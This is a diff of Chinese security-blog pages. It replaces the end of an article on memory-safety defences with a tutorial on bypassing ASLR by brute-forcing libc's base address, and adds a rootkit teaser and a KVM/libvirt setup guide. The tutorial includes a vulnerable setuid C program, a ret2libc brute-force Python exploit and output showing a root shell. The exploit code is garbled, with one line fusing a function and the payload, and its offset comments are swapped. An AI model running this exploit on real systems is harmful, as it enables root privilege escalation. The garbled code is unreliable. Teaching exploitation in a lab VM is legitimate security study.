-<p>然而，检测边界并不能解决use-after-free, double-free(use-after-free的特列)问题. 此时，实施时域安全可作为补充。1）特殊的分配器：释放的内存只能被同类型对象重用并对齐。此策略可阻止user-after-free攻击，但对dangling pointers无效；2）基于对象的方法：利用影子内存标记每一块释放的内存位置，如果访问最近被释放的空间就能被检测到。著名的Valgrind内存检测就是利用此方法来检测user-after-free错误的。有关Valgrind的内存检测技术将会在后续的文章<a href="http://www.chongh.wiki/blog/2016/02/20/valgrind-memory/" target="_blank" rel="external">Valgrind内存检测</a> 详细介绍。如果标记的内存区域重新被新的指针指向，对其的非法访问就检测不到了；3）基于指针的方法：同时维护指针的边界信息与内存分配信息实施全面的内存安全。</p>
-<p><strong><em>Step 3: 代码完整性(code integrity, 对应修改代码),代码指针完整性(code pointer integrity，对应修改代码指针)以及数据完整性（data integrity，对应修改数据变量).</em></strong></p>
-<p>代码完整性保证程序中的代码不可写性，可以将含有代码的所有内存页面设置为read-only,所有现代CPU都支持此操作。但是，代码完整性并不支持自我修改(self-modifying)的代码以及即时(Just-In-Time, JIT)编译。代码指针完整性保护指针不被修改，对于不变指针，如全局偏移表、虚拟函数表（vtable),可将其内存页设置read-only。但大部分指针，如定义的函数指针或保存的返回地址必须是可写的。另外，就算内存中所有的函数指针都能实施代码指针完整性，并不能防御use-after-free攻击，例如，通过悬挂指针读取错误的vtable<br>来改变程序的控制流并不会涉及内存中的覆盖代码指针操作。</p>
-<p>数据完整性的实施近似空间安全保护，但并没有实施时域安全保护。数据完整性包括基于对象的完整性保护以及基于points-to集合的完整性保护。基于对象的完整性保护利用静态指针分析来鉴别出不安全的指针集(比如可能会越界的指针)以及指针的points-to集合，然后在代码中插入用影子内存跟踪对象的创建与释放的代码，当对不安全的指针进行写操作或引用操作时会检测指针的位置是否标记在影子内存中。基于points-to集合的完整性保护在基于对象的完整性保护上加了一个限制，每个解引用只能写它自己指向的集合对象，是对其保护的加强。</p>
-<p><strong><em>Step 4: ISR(对应指针转向攻击者特定代码),ASLR（对应指向shellcode或者gadget的地址),DSR(对应解析输出的数据变量).</em></strong></p>
-<p>ISR随机化系统指令来保护代码破坏攻击，随着硬件的更新与发展,ISR技术已经废弃；ASLR随机化代码和数据的存储位置来防御控制流劫持攻击，如果payload(指恶意代码中执行恶意操作的部分）在虚拟内存空间的地址不是固定的，攻击者就无法转移控制流。ASLR也是目前用来保护劫持攻击运用最广泛的技术，然后ASLR的随机化是可预测的，尤其是32位机器，heap-spraying以及JIT-spraying技术可以多次填充payload使随机化失效；</p>
-<p>DSR将存储在内存中的数据形式，而不是存储位置，进行随机化。它为每个变量,包括指针，生成不同的key并进行加密操作，数据的每次读取/存储操作都多了个加解密过程。该方法在代码注入之前都要对指针进行静态分析，overhead较大，但保护比较健壮，能有效防止信息泄露，还能防御控制流劫持以及数据攻击。</p>
-<p><strong><em>Step 5: 控制流完整性（control-flow integrity,对应利用间接跳转指令 call/jump 引用指针，利用返回指令引用指针)以及数据流完整性(data-flow integrity，对应引用破坏后的数据变量).</em></strong></p>
-<p>控制流完整性包括动态返回完整性以及静态控制流图完整性。前文提到的栈粉碎性保护机制不能保护间接调转（call and jump)，不能防御直接修改破坏以及信息泄露，但开销小，兼容性好，所以运用比较广泛。影子栈技术能够解决栈粉碎性保护的信息泄露以及直接修改破坏问题，它把返回地址存入隔离的影子栈中，当函数返回时，对原有栈和影子栈两处保存的值做比较，已保证不被篡改。为了防御控制流劫持，不但要保护返回值，还要保护间接跳转，静态控制流图完整性的方式标记所有的call,jump，并将其标记信息存储在特殊的影子内存中或直接放进代码里; 数据流完整性在数据被使用前，通过检查read指令检测数据是否被破坏。它使用静态points-to分析构建一个全局的可达定义集合（reaching definition sets)，保证数据变量最近一次被写是通过程序中的写指令写入的，而不是攻击者可控制的写入。有关reaching definition sets的定义可参考 <a href="https://en.wikipedia.org/wiki/Reaching_definition" target="_blank" rel="external">wikipedia page on Reaching definition</a>.</p>
-<p><strong><em>Step 6: 不可写数据策略(Non-executable data,对应执行注入的shellcode).</em></strong><br>Non-executable data 保护栈、堆之类的内存页面不可执行，只需要设置内存页面的执行位即可。实际上Non-executable data策略与代码完整性结合就是W⊕X机制。</p>
-<p>每个攻击过程对应的防御机制都已讲完。横向来看，所有攻击模型的每个步骤都有多个防御方法；纵向来看，每种攻击在不同的实施阶段也有不同的防御方法，如控制流劫持攻击，从Step1-6分别有，内存安全性机制（step 1-2),代码指针完整性(step 3),ASLR(step 4), 控制流完整性（step 5）以及不可写数据策略（step 6)不同的防御机制。要阻止某种攻击或多种攻击，需要结合多种防御机制，每种机制也都有其优势与弱点。评判防御机制的性质，可从以下方面去衡量，保护强度、误报率、漏报率、性能开销、内存开销、兼容性，是否模块化等。</p>
-<p>至此，内存持久战系列文章就到这里了，水平有限，很多不到位的地方欢迎补充修正。 回顾一下，最后用下面这张图总结，就清晰明了了。</p>
-<figure><br>    <a href="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" target="_blank" rel="external"><img src="http://7xppf1.com1.z0.glb.clouddn.com/memorywar.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.drdobbs.com/security/anatomy-of-a-stack-smashing-attack-and-h/240001832?pgno=1" target="_blank" rel="external">Anatomy of a Stack Smashing Attack and How GCC Prevents It
-</a></p>
-<p><a href="https://www.blackhat.com/presentations/bh-usa-08/Shacham/BH_US_08_Shacham_Return_Oriented_Programming.pdf" target="_blank" rel="external">Return-oriented Programming: Exploitation without Code Injection</a>.</p>
-<p><a href="https://en.wikipedia.org/wiki/Reference_monitor" target="_blank" rel="external">wikipedia page on reference monior</a></p>
-<p><a href="https://www.cs.virginia.edu/~weimer/p/p477-necula.pdf" target="_blank" rel="external">CCured</a></p>
-<p><a href="https://nebelwelt.net/publications/files/13Oakland.pdf" target="_blank" rel="external">S&amp;P’13 Eternal War in Memory </a></p>
-<p>作者[@diting0x] 于Lawson computer science building</p>
+<p><u>阅读基础</u>:<br>    <a href="http://www.csyssec.org/20161230/stackbufferflow/" target="_blank" rel="external">经典栈缓冲区溢出</a><br><u>VM Setup</u>: Ubuntu 12.04(x86)</p>
+<p>在这篇文章中，我们来看看如果利用暴力破解技术来绕过共享库的地址随机化。</p>
+<h3 id="什么是暴力破解"><a href="#什么是暴力破解" class="headerlink" title="什么是暴力破解"></a>什么是暴力破解</h3><p>通过此技术，攻击者选择一个特定的libc基地址，然后不断尝试攻击程序，直到成功。如果你幸运的话，这是绕过ASLR最简单的技术。</p>
+<p><u>漏洞代码</u>:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//vuln.c</span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>];</div><div class="line"> <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]);</div><div class="line"> <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf);</div><div class="line"> fflush(<span class="built_in">stdout</span>);</div><div class="line"> <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p><u>编译命令</u>：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#echo 2 &gt; /proc/sys/kernel/randomize_va_space</span></div><div class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o vuln vuln.c</div><div class="line">$sudo chown root vuln</div><div class="line">$sudo chgrp root vuln</div><div class="line">$sudo chmod +s vuln</div></pre></td></tr></table></figure>
+<p>现在让我们来看看攻击者是如何暴力破解libc基地址的。下面是当开启随机化时，libc不同的基地址：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb75b6000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7568000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7595000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb75d9000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb7542000</span>)</div><div class="line">$ ldd ./vuln | grep libc</div><div class="line"> libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xb756a000</span>)</div><div class="line">$</div></pre></td></tr></table></figure>
+<p>从上面可知，libc的随机化只局限在8个比特位中。因此，最多只要尝试256次，就可以获取root shell。下面的漏洞利用代码中，选择0xb7595000作为libc的基地址，然后我们再不断尝试</p>
+<p><u>漏洞利用代码</u>：<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">libc_base_addr = <span class="number">0xb7595000</span></div><div class="line">exit_off = <span class="number">0x00032be0</span>             #Obtained from <span class="string">"readelf -s libc.so.6 | grep system"</span> command.</div><div class="line">system_off = <span class="number">0x0003f060</span>           #Obtained from <span class="string">"readelf -s libc.so.6 | grep exit"</span> command.</div><div class="line">system_addr = libc_base_addr + system_off</div><div class="line">exit_addr = libc_base_addr + exit_off</div><div class="line">system_arg = <span class="number">0x804827d</span></div><div class="line"></div><div class="line">#endianess convertion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numystem + <span class="built_in">exit</span> + system_arg</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">268</span></div><div class="line">buf += conv(system_addr)</div><div class="line">buf += conv(exit_addr)</div><div class="line">buf += conv(system_arg)</div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">#Multiple tries until we get lucky</div><div class="line">i = <span class="number">0</span></div><div class="line"><span class="keyword">while</span> (i &lt; <span class="number">256</span>):</div><div class="line"> print <span class="string">"Number of tries: %d"</span> %i</div><div class="line"> i += <span class="number">1</span></div><div class="line"> ret = call([<span class="string">"./vuln"</span>, buf])</div><div class="line"> <span class="keyword">if</span> (not ret):</div><div class="line">  <span class="keyword">break</span></div><div class="line"> <span class="keyword">else</span>:</div><div class="line">  print <span class="string">"Exploit failed"</span></div></pre></td></tr></table></figure></p>
+<p>执行上面的漏洞利用代码就可以获取root shell，如下所示</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line">Number of tries: <span class="number">0</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line">Exploit failed</div><div class="line">...</div><div class="line">Number of tries: <span class="number">42</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line">Exploit failed</div><div class="line">Number of tries: <span class="number">43</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`@]��&#123;\�&#125;�</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
+<p><u>注意</u>： 类似地，栈地址和堆地址也可以暴力破解！</p>
 <hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170101/memorysafety-defense/" target="_blank" rel="external">内存持久战之防御措施</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/bypassaslr-bruteforce" target="_blank" rel="external">Linux(X86)漏洞利用系列-绕过ASLR-第二篇章(暴力破解)</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
 
       
     </div>
     <footer class="entry-meta entry-footer">
       
 	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/内存安全/">内存安全<span class="article-category-count">3</span></a>
+    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
 
 
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ASLR/">ASLR</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
 
       
     </footer>
@@ -461,7 +453,7 @@
 <!-- Table of Contents -->
 
   
-    <article id="post-memorysafety-attack"  class="article article-type-post" itemscope itemprop="blogPost" >
+    <article id="post-rootkittutorial"  class="article article-type-post" itemscope itemprop="blogPost" >
   <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
     
     
@@ -469,7 +461,7 @@
         
   
     <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/20170101/memorysafety-attack/">内存持久战之攻击模型</a>
+      <a class="article-title" href="/20170102/rootkittutorial/">Rootkit综合教程</a>
     </h1>
   
 
@@ -477,8 +469,8 @@
     
     <div class="article-meta">
       
-	Posted on <a href="/20170101/memorysafety-attack/" class="article-date">
-	  <time datetime="2017-01-01T04:29:44.000Z" itemprop="datePublished">一月 1, 2017</time>
+	Posted on <a href="/20170102/rootkittutorial/" class="article-date">
+	  <time datetime="2017-01-02T09:18:13.000Z" itemprop="datePublished">一月 2, 2017</time>
 	</a>
 
     </div>
@@ -490,20 +482,24 @@
             <div class="entry-summary" style="margin-left:0;">
             作者：Diting0x
 
-CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存的安全性问题，以及相应的攻击模型及防御措施，对整个系统安全问题的概览有很大的帮助。转载本文请务必注明，文章出处：《内存持久战之攻击模型》与作者信息：Diting0x
+CSysSec注： 本文来自Diting0x的个人博客，分析了Linux下不同类型的rootkit、相关原理以及源码分析，值得推荐。转载本文请务必注明，文章出处：《Rootkit综合教程》与作者信息：Diting0x
 
 
 
-0X01 基本攻击模型
-0X02 构建攻击模型
 
-
-内存破坏是计算机安全中亘古不变的话题。内存破坏也被看作是top three危险的软件错误。像C/C++这种底层语言很容易引来这些bugs. 这些程序语言无法对内存安全性的保证，以至于让一些攻击者利用内存bugs改变程序行为或甚至控制整个控制流（control-flow).  要了解什么是内存安全性，可参考上一篇文章：内存持久战-内存安全性.  然而，一种最显而易见的解...
+0x01: Definition of rootkit 
+0x02: Classification of Rootkit
+0x03: Hooking(Kernel Object Hooking) Rootkit
+0X04: DKOM Rootkit
+0x05: Rootkit Objectives
+0x06: Example-Module Hiding
+0x07: Example-Process Hiding
+0x08: Rootkit ...
           
 
         
           <p class="article-more-link">
-            <a href="/20170101/memorysafety-attack/#more">阅读全文</a>
+            <a href="/20170102/rootkittutorial/#more">阅读全文</a>
           </p>
         </div>
       
@@ -511,12 +507,256 @@ CSysSec注： 本系列文章来自Diting0x的个人博客，主要介绍内存�
     <footer class="entry-meta entry-footer">
       
 	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/内存安全/">内存安全<span class="article-category-count">3</span></a>
+    <a class="article-category-link" href="/categories/恶意代码/">恶意代码<span class="article-category-count">9</span></a>
 
 
       
   <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Memory/">Memory</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Malware/">Malware</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Rootkit/">Rootkit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li></ul>
+
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!-- Table of Contents -->
+
+  
+    <article id="post-virtualizationcomprehensive"  class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" itemprop="name">
+      <a class="article-title" href="/20170102/virtualizationcomprehensive/">虚拟机环境搭建、管理、监控与分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	Posted on <a href="/20170102/virtualizationcomprehensive/" class="article-date">
+	  <time datetime="2017-01-02T08:23:01.000Z" itemprop="datePublished">一月 2, 2017</time>
+	</a>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>作者：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<p><strong>CSysSec注</strong>： 本文来自<a href="http://www.chongh.wiki/about/" target="_blank" rel="external">Diting0x</a>的<a href="http://www.chongh.wiki/blog/2016/03/31/virt-setup-analysis/" target="_blank" rel="external">个人博客</a>，从虚拟机的环境搭建、管理、监控到分析，介绍的内容非常全面，值得推荐。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/virtualizationcomprehensive/" target="_blank" rel="external">虚拟机环境搭建、管理、监控与分析</a>》与作者信息：<a href="http://weibo.com/diting0x" target="_blank" rel="external">Diting0x</a></p>
+<hr>
+<blockquote>
+<ul>
+<li>0x01 全文环境 </li>
+<li>0x02 虚拟机创建KVM/QEMU </li>
+<li>0x03 虚拟机管理Libvirt</li>
+<li>0x04 虚拟机监控Libvmi</li>
+<li>0x05 虚拟机监控Volatility</li>
+</ul>
+</blockquote>
+<p>本文介绍了一套完整的虚拟化环境搭建与分析工作，包括虚拟机的创建，虚拟机的管理，以及虚拟机的监控与分析。可根据自身需要阅读相关内容。</p>
+<hr>
+<h3 id="0x01-全文环境"><a href="#0x01-全文环境" class="headerlink" title="0x01 全文环境"></a>0x01 全文环境</h3><p>Ubuntu12.04 + Kvm-kmod-3.8 + Qemu-kvm-1.1.2+ Libvirt 1.3.2 + Libvmi + Volatility </p>
+<h3 id="Ox02-虚拟机创建KVM-QEMU"><a href="#Ox02-虚拟机创建KVM-QEMU" class="headerlink" title="Ox02 虚拟机创建KVM/QEMU"></a>Ox02 虚拟机创建KVM/QEMU</h3><p>Kvm需要CPU的支持（Intel VT 或者 AMD SVM)，在安装KVM之前，可先检查CPU是否支持硬件虚拟化技术。基于Intel的系统，可运行 ‘grep vmx /proc/cpuinfo’ 查看是否含有vmx的关键字，如果有，则表示支持；基于AMD的系统，可运行 ‘grep svm /proc/cpuinfo’ 查看是否含有svm的关键字。<br>另外，CPU若支持硬件虚拟化，还得确保BLOS开启了VT选项（有些厂商默认是禁用的，如thinkpad t450). 可以下载 cpu-checker 工具（apt-get install cpu-checker)，之后运行kvm-ok， 如果提示 kvm acceleration can not be used，则可能是blos禁用了kvm虚拟化，在blos设置中开启即可。</p>
+<p>可执行：</p>
+<pre><code>modprobe kvm 
+modprobe kvm_intel 
+</code></pre><p>开启内核自带的kvm</p>
+<p>关于源码安装kvm-kmod以及qemu-kvm的详细过程可参考 <a href="http://www.csyssec.org/20170102/kvmqemuintro/" target="_blank" rel="external">上一篇</a> 文章。kvm-kmod安装成功后，运行lsmod | grep kvm， 会显示两个module:</p>
+<pre><code>kvm_intel             137721  3 
+kvm                   415549  1 kvm_intel
+</code></pre><p>qemu-kvm安装成功后会在/your-confiure-location/bin/qemu-system-x86_64等可执行文件。</p>
+<p>安装完KVM/QEMU后，创建虚拟机的时候，虚拟机的网络方式是比较关心的问题，KVM/QEMU有两种网络配置方式。</p>
+<p>其一，用户模式（User Networking): 即NAT方式，也是默认的网络模式。让虚拟机访问主机、互联网或本地网络上的资源的简单方法，但是不能从网络或其他的客户机访问客户机。既然无法访问客户机，那宿主机与客户机该如何传输文件呢？默认的，客户机得到的ip空间为10.0.2.0/24，宿主机提供了ip为10.0.2.2的地址让虚拟机访问。可以ssh到宿主机(10.0.2.2)，用scp来拷贝文件。</p>
+<p>其二，桥接模式（Bridge Networking): 这种模式允许客户机就像一台独立的主机一样拥有网络。这种方式要比用户网络复杂一些，但是设置好后客户机与互联网，客户机与主机之间的通信都很容易。桥接网络需要网卡支持，一般的有线网卡都支持，绝大部分的无线网卡都不支持。</p>
+<p>NAT方式是KVM/QEMU提供的默认方式，要设置桥接模式，首先在宿主机上安装桥接相关的包，</p>
+<pre><code>apt-get install bridge-utils. 
+</code></pre><p>修改/etc/network/interfaces</p>
+<pre><code>auto lo
+iface lo inet loopback
+auto eth0
+iface eth0 inet manual
+auto br0
+iface br0 inet dhcp
+   bridge_ports eth0
+   bridge_stp off
+   bridge_fd 9
+   bridge_hello 2
+   bridge_maxwait 0
+</code></pre><p>执行</p>
+<pre><code>/etc/init.d/networking restart
+</code></pre><p>配置好后，可运行brctl-show命令，会显示：</p>
+<pre><code>bridge name      bridge id              STP enabled interfaces
+br0              8000.68f728eddb0d      no          eth0
+                                              vnet0
+</code></pre><p>之后在创建虚拟机的时候可添加-net nic -net tap参数，如</p>
+<pre><code>/usr/local/bin/qemu-system-x86_64 -hda imgname.img -vnc :1 -m 1024 -net nic -net tap -monitor stdio    
+</code></pre><p>之后创建的虚拟机便工作在网桥模式中。</p>
+<h3 id="0x03-虚拟机管理Libvirt"><a href="#0x03-虚拟机管理Libvirt" class="headerlink" title="0x03 虚拟机管理Libvirt"></a>0x03 虚拟机管理Libvirt</h3><p>除了用qemu命令行的方式创建与管理虚拟机，也可将一些命令行参数保存为xml配置文件，用libvirt来管理。libvirt是一套管理虚拟机的工具，包括管理虚拟机的API、一个守护进程（libvirtd)和一个命令行工具（virsh). Libvirt 的主要目标是提供一个单一途径以管理多种不同虚拟化方案已经虚拟化主机，包括KVM/QEMU,Xen,LXC等。安装libvirt后，会产生libvirtd进程以及virsh工具，要利用libvirt做开发，可调用其中的API。libvirt, libvirtd 以及virsh的关系如下图：</p>
+<p><img src="http://7xppf1.com1.z0.glb.clouddn.com/libvirt-internal.png" alt="libvirt-internal"></p>
+<p>详细介绍可参考：<a href="http://libvirt.org/internals.html" target="_blank" rel="external">libvirt internals</a></p>
+<p>安装libvirt: </p>
+<p>先安装libvirt所依赖的包</p>
+<pre><code>apt-get install libnl-dev libxml2 libxml2-dev  libpciaccess-dev libyajl-dev libdevmapper-dev libgnutls-dev
+</code></pre><p>如出现以下错误，都可以检查上述这些包是否安装好</p>
+<pre><code>error: Could not find libxml2 anywhere
+
+error: You must install the GnuTLS library in order to compile and run libvirt
+
+error: You must install device-mapper-devel/libdevmapper &gt;= 1.0.0 to compile libvirt
+
+error: libnl-devel &gt;= 1.1 is required for macvtap support
+</code></pre><p>下载libvirt1.3.2.tar.gz</p>
+<pre><code>tar xvf libvirt1.3.2.tar.gz
+./configure
+make &amp;&amp; make install
+</code></pre><p>安装完成后，执行ldconfig同步链接库，否则会出现以下错误：</p>
+<pre><code>virsh: error while loading shared libraries: libvirt.so.0: cannot open shared object file: No such file or directory
+</code></pre><p>执行检查libvirt安装成功</p>
+<pre><code>which libvirtd
+libvirtd –version
+which virsh
+virsh –version
+</code></pre><p>若出现此类错误：</p>
+<pre><code>error: Failed to reconnect to the hypervisor
+error: no valid connection
+error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/libvirt-sock&apos;: No such file or directory
+</code></pre><p>则很有可能是libvirtd进程没有开启，这时需要手动开启libvirtd,执行libvirtd -d 即可。(libvirtd具体参数可参考：<a href="http://linux.die.net/man/8/libvirtd" target="_blank" rel="external">libvirtd manual</a> ）</p>
+<p>另外注意，libvirt从1.3版本后增加了virtlogd特性，需要执行virtlogd -d手动开启virtlogd进程（virtlogd具体参数可参看：<a href="https://www.mankier.com/8/virtlogd" target="_blank" rel="external">virtlogd manual</a> ）. 否则会出现以下错误：</p>
+<pre><code>error: Failed to connect socket to &apos;/usr/local/var/run/libvirt/virtlogd-sock&apos;: No such file or directory
+</code></pre><p>安装好libvirt后，便可配置好xml文件，用virsh来管理。具体virsh命令这里不做介绍，可参考其中一个配置文件：</p>
+<pre><code>&lt;domain type=&apos;kvm&apos;&gt;
+&lt;name&gt;ubuntudemo&lt;/name&gt;&lt;!--虚拟机名称--&gt;
+&lt;memory&gt;1048576&lt;/memory&gt;&lt;!--最大内存，单位KB--&gt;
+&lt;currentMemory&gt;1048576&lt;/currentMemory&gt;&lt;!--可用内存，单位k--&gt;
+&lt;uuid&gt;87d5b3d2-3618-4a59-9efb-aa869ff34999&lt;/uuid&gt;
+
+&lt;vcpu&gt;1&lt;/vcpu&gt;&lt;!--虚拟cpu个数--&gt;
+&lt;os&gt;
+    &lt;type arch=&apos;x86_64&apos;,machine=&apos;pc&apos;&gt;hvm&lt;/type&gt;
+    &lt;boot dev=&apos;hd&apos;/&gt;&lt;!--光盘启动--&gt;
+&lt;/os&gt;
+&lt;features&gt;
+    &lt;acpi/&gt;
+    &lt;apic/&gt;
+    &lt;pae/&gt;
+&lt;/features&gt;
